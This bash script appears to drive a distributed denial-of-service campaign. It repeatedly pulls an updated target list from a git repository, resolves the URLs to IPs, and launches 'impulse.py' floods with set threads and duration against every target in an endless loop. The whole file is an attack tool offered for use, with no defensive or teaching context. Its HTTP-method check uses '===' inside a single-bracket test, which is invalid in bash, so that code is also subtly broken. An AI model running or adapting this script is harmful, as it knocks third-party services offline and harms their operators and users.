# Create variables from named arguments.
while [ $# -gt 0 ]; do
  if [[ $1 == *"--"* ]]; then
      v="${1/--/}"
      declare $v="$2"
  fi
  shift
done

# Set default values for arguments if missing.
method="${method:-HTTP}" 
time="${time:-50}"
threads="${threads:-20}"
ip_refresh_period_sec=1800; # 30 minutes

attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"

while true
do
  echo "Get the latest scripts & URLs..."
  git pull --rebase
  echo "Check if need to convert URLs to IPs..."
  now=$(date +%s)
  last_updated_at=0
  if [ -f ips ]; then
    last_updated_at=$(date -r ips +%s)
  fi 
  diff=`expr ${now} - ${last_updated_at}` 
  if [ "$diff" -gt "$ip_refresh_period_sec" ]; then
    echo "Resolving IPs..."
    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
  fi
  echo "Done!"
  echo "Start attacking..."
  if [ "$method" === "HTTP" ]; then
    cat urls | xargs -n1 -I % bash -c "${attack}"
  else
    cat ips | xargs -n1 -I % bash -c "${attack}"
  fi

  sleep 1
done
